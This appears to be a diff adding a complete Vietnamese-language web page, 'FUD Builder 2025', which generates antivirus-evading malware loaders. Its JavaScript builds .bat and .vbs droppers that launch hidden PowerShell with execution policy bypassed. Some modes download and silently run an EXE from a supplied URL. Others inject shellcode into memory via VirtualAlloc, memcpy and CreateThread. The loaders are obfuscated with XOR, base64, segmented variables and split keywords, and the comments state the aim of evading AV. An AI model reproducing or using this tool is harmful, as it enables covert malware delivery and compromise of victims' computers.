@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FUD Builder 2025 (Tối Ưu Stealth)</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        /* CSS ĐÃ TỐI ƯU HÓA GIAO DIỆN */
+        body { 
+            background-color: #121212; 
+            color: #e0e0e0;
+        }
+        .container { 
+            max-width: 800px; 
+            margin-top: 40px; 
+            padding: 0 15px;
+        }
+        h2, h3 { 
+            color: #4CAF50; 
+            margin-bottom: 20px;
+        }
+
+        .card { 
+            background-color: #1e1e1e; 
+            border: 1px solid #333;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5); 
+            margin-bottom: 20px !important;
+        }
+        textarea, input.form-control { 
+            background-color: #2c2c2c; 
+            border: 1px solid #444; 
+            color: #f0f0f0;
+            border-radius: 8px;
+            padding: 10px;
+            transition: border-color 0.3s;
+        }
+        textarea:focus, input.form-control:focus {
+            background-color: #383838;
+            border-color: #4CAF50; 
+            box-shadow: 0 0 0 0.2rem rgba(76, 175, 80, 0.25);
+        }
+        
+        button.btn-primary { 
+            background-color: #4CAF50; 
+            border-color: #4CAF50; 
+            transition: background-color 0.3s;
+        }
+        button.btn-primary:hover { 
+            background-color: #388E3C; 
+            border-color: #388E3C;
+        }
+        button.btn-secondary {
+            background-color: #333;
+            border-color: #444;
+            color: #f0f0f0;
+        }
+        button.btn-secondary:hover {
+            background-color: #444;
+        }
+        .dropzone { 
+            border: 2px dashed #4CAF50; 
+            padding: 20px; 
+            border-radius: 8px; 
+            background: #2c2c2c; 
+            color: #b0b0b0; 
+            transition: background-color 0.3s;
+        }
+        .dropzone.dragover { 
+            border-color:#00BCD4; 
+            background:#383838; 
+            color:#fff; 
+        }
+        
+        .progress-container { 
+            background:#333; 
+            border-radius:6px;
+        }
+        .progress-bar { 
+            background:#00BCD4; 
+        }
+
+        /* Định dạng chung */
+        textarea, button, input { margin-bottom:10px; width:100%; font-family: monospace; }
+        textarea { height:140px; padding:8px; border-radius:6px; resize:vertical; }
+        .small { font-size:0.9em; color:#a0a0a0; }
+        .tab-buttons { margin-bottom: 20px; display: flex; flex-wrap: wrap; }
+        .tab-buttons .btn { width: auto; margin-right: 10px; margin-bottom: 10px; } 
+        .tab-content { display: none; padding: 15px 0; }
+        .tab-content.active { display: block; }
+        #shellcodeFormat, #vbsPayloadType { width: 100% !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>FUD Builder 2025 (Tối Ưu Stealth)</h2>
+
+        <div class="tab-buttons">
+            <button class="btn btn-secondary tab-switch-btn" data-target="fileTab">Build từ File (.bat)</button>
+            <button class="btn btn-secondary tab-switch-btn" data-target="urlTab">Build từ URL (.bat)</button>
+            <button class="btn btn-secondary tab-switch-btn" data-target="shellcodeTab">Mã hóa Shellcode (.bat)</button>
+            <button class="btn btn-secondary tab-switch-btn" data-target="vbsTab">Build FUD VBS</button> 
+        </div>
+        
+        <div id="fileTab" class="tab-content card p-4 mb-4">
+            <h3>Build từ File</h3>
+            <div class="dropzone" id="dropzone">Kéo & thả file (.bat, .txt, .exe) hoặc bấm Open file</div>
+            <input type="file" id="fileInput" accept=".exe,.bat,.txt" style="display:none"/>
+            <button id="openFileBtn" class="btn btn-secondary">Open file</button>
+            <button id="buildFileBtn" class="btn btn-primary">Build FUD .bat từ File</button> 
+        </div>
+
+        <div id="urlTab" class="tab-content card p-4 mb-4">
+            <h3>Build từ URL</h3>
+            <input type="text" id="urlInput" placeholder="Nhập URL payload (ví dụ: http://server.com/payload.exe)" class="form-control" />
+            <button id="buildUrlBtn" class="btn btn-primary">Build FUD .bat từ URL</button>
+        </div>
+
+        <div id="shellcodeTab" class="tab-content card p-4 mb-4">
+            <h3>Mã hóa Shellcode (Hex/Base64)</h3>
+            <textarea id="shellcodeInput" rows="8" placeholder="Dán Shellcode (dạng Hex hoặc Base64) vào đây."></textarea>
+            <select id="shellcodeFormat" class="form-control mb-3">
+                <option value="Hex">Đầu vào là Hex String (ví dụ: 9090c3...)</option>
+                <option value="Base64">Đầu vào là Base64 String</option>
+            </select>
+            <button id="buildShellcodeBtn" class="btn btn-primary">Build FUD .bat (Shellcode)</button>
+        </div>
+
+        <div id="vbsTab" class="tab-content card p-4 mb-4">
+            <h3>Build FUD VBS Loader (.vbs)</h3>
+            <p class="small text-danger">Chế độ này sẽ tạo ra file VBScript ẩn danh để thực thi Shellcode hoặc giải nén EXE.</p>
+            
+            <select id="vbsPayloadType" class="form-control mb-3">
+                <option value="exe_file">Payload là File EXE (Upload)</option>
+                <option value="shellcode_input">Payload là Shellcode (Dán vào Base64)</option>
+            </select>
+            
+            <div id="vbsExeSection">
+                <div class="dropzone" id="vbsDropzone">Kéo & thả file EXE hoặc bấm Open file</div>
+                <input type="file" id="vbsFileInput" accept=".exe" style="display:none"/>
+                <button id="openVbsFileBtn" class="btn btn-secondary">Open EXE file</button>
+                <div id="vbsFileName" class="small text-success">Chưa có file nào được chọn.</div>
+            </div>
+
+            <div id="vbsShellcodeSection" style="display:none;">
+                <textarea id="vbsShellcodeInput" rows="6" placeholder="Dán Shellcode (chỉ chấp nhận Base64) vào đây."></textarea>
+            </div>
+
+            <button id="buildVbsBtn" class="btn btn-primary">Build FUD VBS</button>
+        </div>
+        
+
+        <div class="card p-4">
+            <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+            <div id="progressText" class="small"></div>
+
+            <h3>Kết quả file .bat/.vbs:</h3>
+            <textarea id="output" rows="12" readonly placeholder="Nội dung file sẽ xuất ở đây"></textarea>
+            
+            <div class="row">
+                <div class="col-md-6">
+                    <button id="downloadBtn" class="btn btn-success btn-block">Tải file</button>
+                </div>
+                <div class="col-md-6">
+                    <button id="copyBtn" class="btn btn-info btn-block">Copy nội dung</button>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <script>
+        // ==== Global Helpers ====
+        function base64Encode(str){ return btoa(unescape(encodeURIComponent(str))); }
+        function xorEncode(str,key){ 
+            let r=""; 
+            for(let i=0;i<str.length;i++){ 
+                r+=String.fromCharCode(str.charCodeAt(i)^key.charCodeAt(i%key.length)); 
+            } 
+            return r;
+        }
+        function randomString(len=10){ 
+            const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+            let s=""; 
+            for(let i=0;i<len;i++){ 
+                s+=chars.charAt(Math.floor(Math.random()*chars.length));
+            } 
+            return s;
+        }
+        function randomFileName(mode = 'file'){ 
+            if (mode === 'url') {
+                return 'FUD_URL_Encoded_' + randomString(6) + '.bat';
+            }
+            if (mode === 'shellcode') {
+                 return 'FUD_Shellcode_Loader_' + randomString(6) + '.bat';
+            }
+            if (mode === 'vbs') { 
+                 return 'FUD_VBS_Loader_' + randomString(6) + '.vbs';
+            }
+            return 'FUD_' + randomString(6) + '.bat';
+        }
+        function setProgress(percent,text){ 
+            document.getElementById("progressBar").style.width = percent + "%";
+            document.getElementById("progressText").textContent = text;
+            if (percent === 0) {
+                document.getElementById("progressBar").style.width = "0%";
+            }
+        }
+        // Hàm trì hoãn để không làm đơ giao diện
+        const defer = () => new Promise(r => setTimeout(r, 0)); 
+        
+        // Hàm chia Base64 thành các phần để nhúng vào biến BAT (Segmentation)
+        function segmentBase64(base64Payload, varPrefix) {
+            const chunkSize = 150; 
+            let parts = [];
+            for (let i = 0; i < base64Payload.length; i += chunkSize) {
+                parts.push(base64Payload.substring(i, i + chunkSize));
+            }
+
+            let setCommands = '';
+            let psJoinCommand = 'IEX(\'$FULLPAYLOAD = \'\'';
+            
+            parts.forEach((part, index) => {
+                const varName = `${varPrefix}_${index}`;
+                setCommands += `set "${varName}=${part}"\n`;
+                psJoinCommand += ` + '`%${varName}%`'`;
+            });
+            psJoinCommand += '; $DECODED = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($FULLPAYLOAD)));';
+            
+            return { setCommands, psJoinCommand };
+        }
+
+        // ==== Build FUD 1: Chế độ File (.bat) (Tối Ưu Vượt AV/Segmentation) ====
+        async function buildFUD(inputData){
+            
+            setProgress(30,"Đang Base64 hóa (1/3)...");
+            await defer(); 
+            const base64Encoded = base64Encode(inputData);
+            
+            setProgress(60,"Đang Obfuscate & Phân đoạn (2/3)...");
+            await defer(); 
+
+            const varPrefix = randomString(4);
+            const { setCommands, psJoinCommand } = segmentBase64(base64Encoded, varPrefix);
+
+            // Lệnh PS giải mã Base64 và thực thi nội dung .bat bằng 'cmd /c'
+            // Đã sửa lỗi IEX
+            const psCommand = `
+                ${psJoinCommand}
+                $cmd = [char]99+[char]109+[char]100+[char]32+[char]47+[char]99+[char]32; // cmd /c
+                IEX $cmd + $DECODED; 
+            `.replace(/\s+/g, ' ').trim();
+
+            const batContent = `@echo off
+setlocal
+${setCommands}
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "${psCommand}"
+endlocal`;
+
+            document.getElementById("output").value = batContent;
+            setProgress(100,"Hoàn tất mã hóa (3/3) - Stealth & Vượt AV");
+            return batContent;
+        }
+
+        // ==== Build FUD 2: Chế độ URL (.bat) (Tối Ưu Vượt AV/Segmentation) ====
+        async function buildFUD_UrlEncoder(targetUrl){
+            setProgress(10,"Đang mã hóa URL (1/4)...");
+            await defer();
+
+            const urlKey = randomString(10);
+            const xorEncoded = xorEncode(targetUrl, urlKey);
+            
+            setProgress(30,"Đang Base64 hóa & Phân đoạn (2/4)...");
+            await defer();
+            const base64EncodedUrl = base64Encode(xorEncoded);
+
+            setProgress(60,"Đang Obfuscate (3/4)...");
+            await defer();
+
+            const varPrefix = randomString(4);
+            const { setCommands, psJoinCommand } = segmentBase64(base64EncodedUrl, varPrefix);
+            const varUrlKey = randomString(5);
+            const varK = randomString(4);
+            const varUrl = randomString(5);
+            
+            // Tối ưu Vượt AV: Dùng String Splitting cho từ khóa nguy hiểm
+            const psWebClient = 'n'+'ew'+'-o'+'bject '+'System.Net.WebClient';
+            const psDownload = 'Do'+'wn'+'load'+'File';
+
+            const psXorDecode = `
+                ${psJoinCommand}
+                $${varK} = '%${varUrlKey}%'; 
+                $${varUrl} = '';
+                for($i=0;$i -lt $DECODED.Length;$i++) {
+                    $${varUrl} += [char]($DECODED[$i] -bxor [byte][char]$${varK}[$i % $${varK}.Length])
+                };
+            `.replace(/\s+/g, ' ').trim();
+
+            const varPath = randomString(5);
+            
+            const psDownloadExecute = `
+                $${varPath} = [System.IO.Path]::GetTempFileName() -replace '.tmp','.exe';
+                IEX ('${psWebClient}').'${psDownload}'('$' + '${varUrl}','$' + '${varPath}');
+                IEX ('St'+'art'+'-P'+'ro'+'ce'+'ss -Fi'+'le'+'Path '+'$' + '${varPath}'+' -Wi'+'nd'+'owSt'+'yle H'+'id'+'den');
+            `.replace(/\s+/g, ' ').trim();
+
+            const fullPsCommand = psXorDecode + psDownloadExecute;
+            const base64EncodedFullCommand = btoa(unescape(encodeURIComponent(fullPsCommand)));
+            const psFinal = `
+                $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${base64EncodedFullCommand}'));
+                IEX $d
+            `.replace(/\s+/g, ' ').trim();
+
+            setProgress(90,"Đang tạo nội dung .bat (4/4)...");
+            await defer();
+            
+            const batContent = `@echo off
+setlocal
+${setCommands}
+set "${varUrlKey}=${urlKey}"
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "${psFinal}"
+endlocal`;
+
+            document.getElementById("output").value = batContent;
+            setProgress(100,"Hoàn tất Build FUD .bat");
+            return batContent;
+        }
+
+        // ==== Build FUD 3: Chế độ Shellcode (.bat) (Thêm XOR Encryption) ====
+        async function buildFUD_Shellcode(shellcodeData, format) {
+            setProgress(10, "Đang chuẩn bị Shellcode (1/4)...");
+            await defer();
+
+            let finalShellcodeBinary;
+            
+            if (format === 'Hex') {
+                try {
+                    let hex = shellcodeData.replace(/[^0-9a-fA-F]/g, '');
+                    if (hex.length % 2 !== 0) {
+                        setProgress(0, "Lỗi: Shellcode Hex phải có số ký tự chẵn!");
+                        return;
+                    }
+                    finalShellcodeBinary = '';
+                    for (let i = 0; i < hex.length; i += 2) {
+                        finalShellcodeBinary += String.fromCharCode(parseInt(hex.substring(i, i + 2), 16));
+                    }
+                } catch (e) {
+                    setProgress(0, "Lỗi: Shellcode Hex không hợp lệ!");
+                    return;
+                }
+            } else {
+                // Nếu là Base64, decode về binary để XOR
+                finalShellcodeBinary = atob(shellcodeData);
+            }
+
+            setProgress(30, "Đang mã hóa XOR (2/4)...");
+            await defer();
+            const xorKey = randomString(12);
+            const xorEncoded = xorEncode(finalShellcodeBinary, xorKey);
+            const base64Encoded = btoa(xorEncoded);
+
+
+            setProgress(60, "Đang Obfuscate Loader (3/4)...");
+            await defer();
+
+            const varSC = randomString(6); 
+            const varFunc = randomString(5); 
+            const varAlloc = randomString(7); 
+            const varAddr = randomString(4);
+            const varKey = randomString(5);
+            const varOut = randomString(6);
+
+            const psLoader = `
+                $${varSC} = [System.Convert]::FromBase64String('${base64Encoded}');
+                $${varKey} = '${xorKey}';
+                $${varOut} = '';
+
+                # Giải mã XOR
+                for($i=0;$i -lt $${varSC}.Length;$i++) {
+                    $${varOut} += [char]($${varSC}[$i] -bxor [byte][char]$${varKey}[$i % $${varKey}.Length])
+                };
+                $${varSC} = [System.Text.Encoding]::UTF8.GetBytes($${varOut});
+
+                $${varFunc} = IEX ('A'+'d'+'d'+'-T'+'y'+'p'+'e -M'+'e'+'m'+'b'+'e'+'r'+'D'+'e'+'f'+'i'+'n'+'i'+'t'+'i'+'o'+'n @\"
+                    [DllImport("kernel32.dll")]
+                    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+                    [DllImport("kernel32.dll")]
+                    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+                    [DllImport("msvcrt.dll")]
+                    public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
+        \"@ -Name "${varAlloc}" -namespace KernelFuncs -PassThru);
+
+                $${varAddr} = $${varFunc}::VirtualAlloc(0, $${varSC}.Length, 0x3000, 0x40);
+                [Void]$${varFunc}::memcpy($${varAddr}, $${varSC}, $${varSC}.Length);
+                [Void]$${varFunc}::CreateThread(0, 0, $${varAddr}, 0, 0, 0);
+            `.replace(/\s+/g, ' ').trim();
+
+            const base64EncodedFullCommand = btoa(unescape(encodeURIComponent(psLoader)));
+
+            setProgress(90, "Đang tạo nội dung .bat (4/4)...");
+            await defer();
+
+            const batContent = `@echo off
+setlocal
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${base64EncodedFullCommand}
+endlocal`;
+
+            document.getElementById("output").value = batContent;
+            setProgress(100, "Hoàn tất Build FUD Shellcode");
+            return batContent;
+        }
+
+
+        // ==== Build FUD 4: Chế độ VBS Loader (.vbs) (Thêm XOR Shellcode) ====
+        function getVbsExeLoader(payloadVarName) {
+            const tempVar = randomString(4);
+            const varPath = randomString(5);
+            
+            const psAddType = 'A'+'d'+'d'+'-T'+'y'+'p'+'e -A'+'s'+'s'+'em'+'bly'+'N'+'a'+'me S'+'y'+'s'+'tem.I'+'O.C'+'o'+'m'+'pr'+'es'+'s'+'ion.F'+'i'+'le'+'S'+'ys'+'tem';
+            
+            const psLoader = `
+                $${tempVar} = [System.Convert]::FromBase64String('$${payloadVarName}');
+                $${varPath} = [System.IO.Path]::GetTempFileName() -replace '.tmp','.exe';
+                IEX ('${psAddType}');
+                [System.IO.File]::WriteAllBytes($${varPath}, $${tempVar});
+                IEX ('St'+'art'+'-P'+'ro'+'ce'+'ss -Fi'+'le'+'Path '+'$' + '${varPath}'+' -Wi'+'nd'+'owSt'+'yle H'+'id'+'den');
+            `.replace(/\s+/g, ' ').trim();
+
+            const base64EncodedFullCommand = btoa(unescape(encodeURIComponent(psLoader)));
+            return `cmd /c powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${base64EncodedFullCommand}`;
+        }
+
+        function getVbsShellcodeLoader(base64Payload, xorKey) {
+            const varSC = randomString(6); 
+            const varFunc = randomString(5); 
+            const varAlloc = randomString(7); 
+            const varAddr = randomString(4);
+            const varKey = randomString(5);
+            const varOut = randomString(6);
+
+            const psLoader = `
+                $${varSC} = [System.Convert]::FromBase64String('${base64Payload}');
+                $${varKey} = '${xorKey}';
+                $${varOut} = '';
+                
+                # Giải mã XOR
+                for($i=0;$i -lt $${varSC}.Length;$i++) {
+                    $${varOut} += [char]($${varSC}[$i] -bxor [byte][char]$${varKey}[$i % $${varKey}.Length])
+                };
+                $${varSC} = [System.Text.Encoding]::UTF8.GetBytes($${varOut});
+
+                $${varFunc} = IEX ('A'+'d'+'d'+'-T'+'y'+'p'+'e -M'+'e'+'m'+'b'+'e'+'r'+'D'+'e'+'f'+'i'+'n'+'i'+'t'+'i'+'o'+'n @\"
+                    [DllImport("kernel32.dll")]
+                    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+                    [DllImport("kernel32.dll")]
+                    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+                    [DllImport("msvcrt.dll")]
+                    public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
+        \"@ -Name "${varAlloc}" -namespace KernelFuncs -PassThru);
+
+                $${varAddr} = $${varFunc}::VirtualAlloc(0, $${varSC}.Length, 0x3000, 0x40);
+                [Void]$${varFunc}::memcpy($${varAddr}, $${varSC}, $${varSC}.Length);
+                [Void]$${varFunc}::CreateThread(0, 0, $${varAddr}, 0, 0, 0);
+            `.replace(/\s+/g, ' ').trim();
+
+            const base64EncodedFullCommand = btoa(unescape(encodeURIComponent(psLoader)));
+            return `cmd /c powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${base64EncodedFullCommand}`;
+        }
+
+        async function buildFUD_VBS(base64Payload, payloadType) {
+            setProgress(20, "Đang chia Payload (1/3)...");
+            await defer();
+
+            let finalBase64Payload = base64Payload;
+            let xorKey = null;
+
+            if (payloadType === 'shellcode_input') {
+                setProgress(30, "Đang mã hóa XOR Shellcode...");
+                await defer();
+                const binaryShellcode = atob(base64Payload);
+                xorKey = randomString(12);
+                const xorEncoded = xorEncode(binaryShellcode, xorKey);
+                finalBase64Payload = btoa(xorEncoded);
+            }
+
+            const chunkSize = 200; 
+            let parts = [];
+            for (let i = 0; i < finalBase64Payload.length; i += chunkSize) {
+                parts.push(finalBase64Payload.substring(i, i + chunkSize));
+            }
+
+            setProgress(50, "Đang Obfuscate VBS (2/3)...");
+            await defer();
+
+            const vbsVarName = randomString(8);
+            let vbsPayload = `Dim ${vbsVarName}: ${vbsVarName} = ""\n`;
+            parts.forEach(part => {
+                vbsPayload += `${vbsVarName} = ${vbsVarName} & "${part}"\n`;
+            });
+            
+            vbsPayload += "\n";
+            
+            const psCmd = (payloadType === 'exe_file') ? 
+                getVbsExeLoader(vbsVarName) : 
+                getVbsShellcodeLoader(vbsVarName, xorKey); // Pass key for Shellcode Loader
+
+            const batContent = `${vbsPayload}
+Set oShell = CreateObject("WScript.Shell")
+oShell.Run "${psCmd}", 0, False
+Set oShell = Nothing
+`.trim();
+            
+            setProgress(90, "Đang tạo nội dung .vbs (3/3)...");
+            await defer();
+            
+            document.getElementById("output").value = batContent;
+            setProgress(100, `Hoàn tất Build ${payloadType === 'exe_file' ? 'EXE' : 'Shellcode'} Loader (.vbs)`);
+            return batContent;
+        }
+        
+        // ==== Chức năng Chuyển đổi Tab & Event Listeners ====
+        function switchTab(tabId, buttonElement) {
+            document.querySelectorAll('.tab-content').forEach(el => {
+                el.classList.remove('active');
+            });
+            document.getElementById(tabId).classList.add('active');
+
+            document.querySelectorAll('.tab-switch-btn').forEach(btn => {
+                btn.classList.remove('active', 'btn-primary');
+                btn.classList.add('btn-secondary');
+            });
+            buttonElement.classList.add('active', 'btn-primary');
+            buttonElement.classList.remove('btn-secondary');
+            
+            document.getElementById("output").value = "";
+            setProgress(0, "");
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            
+            // 1. Kích hoạt Chuyển đổi Tab
+            document.querySelectorAll('.tab-switch-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    const targetId = this.getAttribute('data-target');
+                    switchTab(targetId, this);
+                });
+            });
+
+            document.querySelector('.tab-switch-btn[data-target="fileTab"]').click();
+
+            // 2. File Handling & Drag & Drop (.bat tabs)
+            const fileInput = document.getElementById("fileInput");
+            document.getElementById("openFileBtn").addEventListener("click",()=>fileInput.click());
+
+            fileInput.addEventListener("change",e=>{
+                if(e.target.files && e.target.files[0]) handleFile(e.target.files[0]);
+                e.target.value='';
+            });
+            function handleFile(file){
+                const reader = new FileReader();
+                setProgress(10,`Đang đọc file ${file.name}...`);
+                reader.onload = async evt=>{
+                    setProgress(30,`Đang mã hóa file ${file.name}...`);
+                    await buildFUD(evt.target.result);
+                };
+                reader.readAsBinaryString(file);
+            }
+
+            const dropzone = document.getElementById("dropzone");
+            ['dragenter','dragover'].forEach(e=>dropzone.addEventListener(e,ev=>{ev.preventDefault(); ev.stopPropagation(); dropzone.classList.add('dragover');}));
+            ['dragleave','drop'].forEach(e=>dropzone.addEventListener(e,ev=>{ev.preventDefault(); ev.stopPropagation(); dropzone.classList.remove('dragover');}));
+            
+            dropzone.addEventListener('drop',e=>{
+                const dt = e.dataTransfer;
+                if(!dt || !dt.files || !dt.files[0]) return;
+                handleFile(dt.files[0]);
+            });
+
+            document.getElementById("buildFileBtn").addEventListener("click", () => {
+                 const fileInput = document.getElementById("fileInput");
+                 if(fileInput.files.length > 0) {
+                     handleFile(fileInput.files[0]);
+                 } else {
+                     setProgress(0, "Vui lòng chọn file trước khi bấm Build");
+                 }
+            });
+
+            document.getElementById("buildUrlBtn").addEventListener("click", async () => {
+              const url = document.getElementById("urlInput").value.trim();
+              if (!url || !url.startsWith('http')) {
+                setProgress(0, "Lỗi: Vui lòng nhập một URL hợp lệ (bắt đầu bằng http/https).");
+                return;
+              }
+              setProgress(10, `Đang mã hóa URL: ${url} ...`);
+              await buildFUD_UrlEncoder(url);
+            });
+            
+            document.getElementById("buildShellcodeBtn").addEventListener("click", async () => {
+                const shellcode = document.getElementById("shellcodeInput").value.trim();
+                const format = document.getElementById("shellcodeFormat").value;
+
+                if (!shellcode) {
+                    setProgress(0, "Lỗi: Vui lòng dán Shellcode vào ô nhập liệu.");
+                    return;
+                }
+
+                await buildFUD_Shellcode(shellcode, format);
+            });
+            
+            // === VBS Builder Logic ===
+            const vbsPayloadType = document.getElementById("vbsPayloadType");
+            const vbsExeSection = document.getElementById("vbsExeSection");
+            const vbsShellcodeSection = document.getElementById("vbsShellcodeSection");
+            const vbsFileInput = document.getElementById("vbsFileInput");
+            const vbsFileNameDisplay = document.getElementById("vbsFileName");
+            let vbsPayloadBase64 = null;
+
+            vbsPayloadType.addEventListener('change', () => {
+                if (vbsPayloadType.value === 'exe_file') {
+                    vbsExeSection.style.display = 'block';
+                    vbsShellcodeSection.style.display = 'none';
+                } else {
+                    vbsExeSection.style.display = 'none';
+                    vbsShellcodeSection.style.display = 'block';
+                }
+                vbsPayloadBase64 = null; 
+                vbsFileNameDisplay.textContent = 'Chưa có file nào được chọn.';
+                document.getElementById("vbsShellcodeInput").value = '';
+            });
+            
+            document.getElementById("openVbsFileBtn").addEventListener("click", () => vbsFileInput.click());
+
+            vbsFileInput.addEventListener("change", e => {
+                if (e.target.files && e.target.files[0]) handleVbsFile(e.target.files[0]);
+            });
+
+            function handleVbsFile(file) {
+                 if (file.name.slice(-4).toLowerCase() !== '.exe') { 
+                     vbsFileNameDisplay.textContent = 'Lỗi: Chỉ chấp nhận file EXE!';
+                     return;
+                }
+                const reader = new FileReader();
+                setProgress(10, `Đang đọc file ${file.name}...`);
+                reader.onload = async evt => {
+                    vbsPayloadBase64 = await new Promise(resolve => {
+                         setTimeout(() => resolve(btoa(evt.target.result)), 0);
+                    }); 
+                    vbsFileNameDisplay.textContent = `File đã chọn: ${file.name} (Sẵn sàng Build)`;
+                    setProgress(100, `Hoàn tất tải file ${file.name}`);
+                };
+                reader.readAsBinaryString(file);
+            }
+            
+            const vbsDropzone = document.getElementById("vbsDropzone");
+            ['dragenter','dragover'].forEach(e=>vbsDropzone.addEventListener(e,ev=>{ev.preventDefault(); ev.stopPropagation(); vbsDropzone.classList.add('dragover');}));
+            ['dragleave','drop'].forEach(e=>vbsDropzone.addEventListener(e,ev=>{ev.preventDefault(); ev.stopPropagation(); vbsDropzone.classList.remove('dragover');}));
+            
+            vbsDropzone.addEventListener('drop',e=>{
+                const dt = e.dataTransfer;
+                if(!dt || !dt.files || !dt.files[0]) return;
+                handleVbsFile(dt.files[0]);
+            });
+            
+            document.getElementById("buildVbsBtn").addEventListener("click", async () => {
+                const type = vbsPayloadType.value;
+                let payload;
+
+                if (type === 'exe_file') {
+                    payload = vbsPayloadBase64;
+                    if (!payload) {
+                        setProgress(0, "Lỗi: Vui lòng chọn file EXE trước.");
+                        return;
+                    }
+                } else { 
+                    payload = document.getElementById("vbsShellcodeInput").value.trim();
+                    if (!payload || !payload.match(/^[a-zA-Z0-9\/\+\=]+$/)) {
+                        setProgress(0, "Lỗi: Vui lòng dán Shellcode Base64 hợp lệ.");
+                        return;
+                    }
+                }
+                
+                await buildFUD_VBS(payload, type);
+            });
+
+            // 4. Download & Copy 
+            document.getElementById("downloadBtn").addEventListener("click", () => {
+                const content = document.getElementById("output").value;
+                if (!content.trim()) {
+                    setProgress(0, "Chưa có nội dung để tải!");
+                    return;
+                }
+                
+                const activeTabId = document.querySelector('.tab-content.active').id;
+                let mode = 'file';
+                if(activeTabId === 'urlTab') mode = 'url';
+                if(activeTabId === 'shellcodeTab') mode = 'shellcode';
+                if(activeTabId === 'vbsTab') mode = 'vbs'; 
+
+                const blob = new Blob([content], { type: "text/plain" });
+                const a = document.createElement("a");
+                a.href = URL.createObjectURL(blob);
+                a.download = randomFileName(mode); 
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                setProgress(100, "Đã tải file");
+            });
+
+            document.getElementById("copyBtn").addEventListener("click", async () => {
+              const content = document.getElementById("output").value;
+              if (!content.trim()) {
+                setProgress(0, "Chưa có nội dung để copy!");
+                return;
+              }
+              try {
+                await navigator.clipboard.writeText(content);
+                setProgress(100, "Đã copy vào clipboard");
+              } catch (e) {
+                setProgress(0, "Không copy được.");
+              }
+            });
+        });
+    </script>
+</body>
+</html>
